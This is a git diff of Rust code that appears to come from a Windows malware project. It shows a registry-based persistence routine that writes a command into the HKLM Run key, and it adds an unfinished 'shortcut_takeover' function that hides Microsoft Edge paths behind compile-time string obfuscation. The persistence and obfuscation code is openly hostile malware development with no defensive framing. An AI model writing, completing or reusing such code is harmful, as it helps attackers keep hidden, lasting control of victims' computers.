@@ -7,12 +7,22 @@ use goldberg::goldberg_string;
 use crate::debug_println;
 
 #[inline]
-pub fn classic_registry_based_survival(program_name: &str, id: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub fn shortcut_takeover(id: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let edgeBinPath = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"); 
+    let edgeDirPath = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application"); 
+
+    // TODO
+
+    return Ok(());
+}
+
+#[inline]
+pub fn classic_registry_based_survival(program_name_in_registry_record: &str, id: &str) -> Result<(), Box<dyn std::error::Error>> {
     if env::consts::OS != "windows" {
         return Ok(());
     }
 
-    if program_name.is_empty() {
+    if program_name_in_registry_record.is_empty() {
         return Err("Program name cannot be empty".into());
     }
 
@@ -32,7 +42,7 @@ pub fn classic_registry_based_survival(program_name: &str, id: &str) -> Result<(
     match hklm.create_subkey(&run_path) {
         Err(e) => Err(Box::new(e) as Box<dyn std::error::Error>),
         Ok((key, _disp)) => {
-            key.set_value(program_name, &command)?;
+            key.set_value(program_name_in_registry_record, &command)?;
             debug_println!("Set persistence in Run path with ID: {}", run_path);
             Ok(())
         }
